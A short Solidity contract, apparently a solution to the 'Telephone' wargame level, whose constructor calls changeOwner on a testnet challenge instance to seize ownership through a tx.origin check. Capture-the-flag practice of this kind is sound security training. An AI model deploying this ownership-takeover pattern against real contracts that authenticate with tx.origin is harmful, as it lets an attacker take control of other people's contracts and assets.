// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ITelephone} from "./ITelephone.sol";

contract TelephoneSolution {
  ITelephone private tel;
  // https://goerli-optimism.etherscan.io/address/0xe23924D99B2ADeE5d6643eE7635d44e447886CFb
  address private telInstanceAddress = 0xe23924D99B2ADeE5d6643eE7635d44e447886CFb;
  address private newOwner = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;

  constructor() {
    tel = ITelephone(telInstanceAddress);
    tel.changeOwner(newOwner);
  }
}
